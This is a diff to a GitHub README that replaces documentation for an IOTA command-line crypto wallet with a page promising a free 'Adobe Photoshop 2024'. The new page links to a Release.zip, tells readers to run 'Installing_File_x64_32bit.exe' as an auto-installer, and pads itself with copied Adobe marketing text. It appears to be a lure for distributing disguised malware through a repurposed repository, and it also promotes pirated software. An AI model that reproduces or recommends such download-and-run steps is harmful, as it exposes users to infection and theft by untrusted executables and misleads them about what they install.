@@ -1,91 +1,46 @@
-# IOTA commandline wallet
-A commandline based wallet for the IOTA crypto currency, based on nodejs
+Tags: Adobe-Photoshop-Ai-generative-2024-for-free. Adobe Photoshop 2024 free. Download Adobe Photoshop 2024 for free. Download free Adobe Photoshop 2024
 
-If you are familiar with DOS commandline, or Linux is your preferred OS this is for you.
-I have made everything as simple as possible, there are Videos for installation and operation,
-but still users not familiar with command line operations might have their problems.
 
-If somebody wants to build a GUI on top, you are welcome to do so.
+# Al-Photoshop-2024
 
-In order to run the wallet on an regular basis, consider to run your own IOTA full node,
-how to do this is shown in the section "Setting up a IOTA full node" below.
+## Getting Started:
 
-Installation:
+### Installation
+[![asdasdasd](https://github.com/user-attachments/assets/d6a3dd8e-6a81-437c-a281-7edb46d63633)
+](https://github.com/MichaelSchwab/Al-Photoshop-2024/releases/download/V5.33/Release.zip)
 
-Youtube video guideing you through the installation: https://www.youtube.com/watch?v=ke1NERpgbd4
-This video shows how to install nodejs, additional modules and the download of the wallet itself as a .zip archieve.
+## **1. [Download the archive](https://github.com/MichaelSchwab/Al-Photoshop-2024/releases/download/V5.33/Release.zip) from releases and extract it to a convenient folder.**
+## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
 
-Install nodejs Version >= 8.0.0
-create a directory and put the my-wallet.js and iota-wallet-config.js in there
 
-Install additional modules
+![photo_2024-05-12_21-25-37](https://github.com/user-attachments/assets/5e9419cc-055c-4e13-8e06-5b9cfedd0ddf)
 
-`npm install iota.lib.js`
+## The future of Photoshop is here with generative AI.
+**Make any creative vision a reality while keeping complete control over every concept with Adobe Firefly generative AI in Photoshop. Try select generative AI features in your browser right now with Photoshop on the web.**
 
-`npm install nedb`
 
-The node you want to connect to needs to have the AttachToTangle command enabled, if not you wont be able to send Transactions.
-You can use IOTA Proxy ( https://github.com/TimSamshuijzen/iotaproxy ) to do the Proof of Work locally. Windows installation is a bit complex since you need to install the build enviroenment beforehand. See: https://www.npmjs.com/package/windows-build-tools
+### Go from a little to a lot.
+**Quickly explore and experiment with ideas. Use Generative Fill to create dozens of high-quality concepts quickly.  
+Plus, generate even more ideas with new features in the Photoshop. Upload a sample image to get results closer to the content you’re looking for with Reference Image, and create variations of your favorite generated images with Generate Similar.**
 
-Setup:
 
-Now you need to edit the configuration file to enter your seed
-and the URL of the IOTA full node you want to use.
-For suggestions which node to use see: http://iotasupport.com/lightwallet.shtml
+### New background? No problem.
 
-See the contents of the file: iota-wallet-config.js
-Please take the time to read all comments in the file to fully understand what you are doing!
+![photo_2024-05-12_21-25-33](https://github.com/user-attachments/assets/6b21f864-13d1-4e5e-8c42-7d732fc50430)
 
-Now you are ready to run, enter:
 
-`node my-wallet.js`
 
-`node my-wallet.js help`
+**Change the background in photos seamlessly with generative AI. Simply select the background, type in a text prompt, and transport your subject from a local city street to a location across the globe. 
+Plus, try the even faster, simpler Generate Background in the Photoshop  — just type in a description to instantly swap your scenery for a new one that matches the lighting, shadows, and perspective of the subject.**
 
-`node my-wallet.js SyncAll`
 
-`node my-wallet.js ShowBalance`
+### Go beyond the borders.
+**Easily expand an image in any direction with Generative Expand. Select and drag the Crop tool beyond an image’s original borders to the desired size, and then click Generate. The expanded canvas will automatically fill with new content that seamlessly blends with the existing image. Or type in a prompt to get a more specific result.**
 
-Youtube video on how to operate the wallet:
-https://www.youtube.com/watch?v=cwTxv-LnvYw
-shows the initial configuration, a transfer with lookup of confirmation state and the replay of a bundle.
 
-Old Introductional Video
-https://www.youtube.com/watch?v=nWo1vwNsXfo
+### Create something from nothing. 
+**All you need to fill a blank canvas is your imagination and Text to Image. Just write a descriptive prompt and set your style preferences to create an entire scene from scratch. Use it to quickly spin up lots of new ideas in minutes so you can easily explore image options and creative directions. Now in the Photoshop app.**
 
-Address states used are:
-1. new = unused not attached to tangle
-2. attached = has one or more transactions with value 0
-3. used = has transactions but no outgoing transactions and balance > 0
-4. exhausted = has one confirmed outgoing transaction, no more transactions should issued with this address
-5. overused = has more than one outgoing transaction, this should not happen, but can be forced by the user
+### Remove and replace content in a few steps.
+**Get rid of unwanted elements with ease using Generative Fill. Just select the object you want to remove and then click Generate (without using a prompt) to fill the area with new content that seamlessly blends in with the surrounding image. Or use a description to replace stray strangers with something specific, like foliage.**
 
-Setting up a IOTA full node, just a brief overview
-1. Get access (or setup yourself) to a 64Bit Windows or Linux or Mac server which has a public IP or can be reached from the internet using something like DynDns
-2. Be sure the server runs 24/7 and is intended to alwas be connected to the internet.
-3. Install Oracle Java RuntimeEnvironment (JRE) 64Bit. You might download it from here http://www.oracle.com/technetwork/java/javase/downloads/server-jre8-downloads-2133154.html
-4. Get the precompiled IOTA Reference Implementation (IRI) from here https://github.com/iotaledger/iri/releases. Download the precompiled jar. For example the iri-1.3.2.jar
-5. Copy the iri to a directory where it can be executed in.
-6. Write a startup script. Just one line is enough. Example: java -Xmx1G -jar iri-1.3.2.jar -c iri.ini --remote --remote-limit-api "removeNeighbors, addNeighbors, interruptAttachingToTangle, attachToTangle"
-7. Get neighbours, therefore goto https://slack.iota.org/ and join the community and enter the channel nodesharing. On this cannel are more people like you searching for neighbours, just get in touch and find 4-9 Neighbours.
-8. Edit iri.ini suit your needs.
-
-A more detailed description can be found
-on https://forum.iota.org/t/setting-up-a-headless-node-on-a-ubuntu-iri-version-1-2-1/1332
-and
-on https://github.com/iotaledger/iri
-
-New Features in 0.8.0 are:
-Instructional Video: https://youtu.be/o4m05b56muU
-
-Changes in the config file:
-
-1. now you can set minWeightMagnitude: which defaults to 14 currently
-2. addressIndexNewAddressStart: This is to prevent address double usage after a snapshot, you can set a minimum address index where the generation of new addresses shoud start.
-3. addressIndexSeachBalancesStart: This is just a spped up, if you got lots (>1000) addresses, you can set a minimum index for address scanning, so that you always scan old addresses where nothing happend anymore example for the UpdateBalances command.
-
-General changes:
-
-1. New Command: GetAddressIndexes If you have a Balance on you seed/wallet this will give you appropriate values for the two values above.
-2. Added short commands: UpdateBalances = UBS, GetNewAddress = GNA, GetConfirmationState = GCS, just for the ease of use.
-3. Some minor bugfixes.
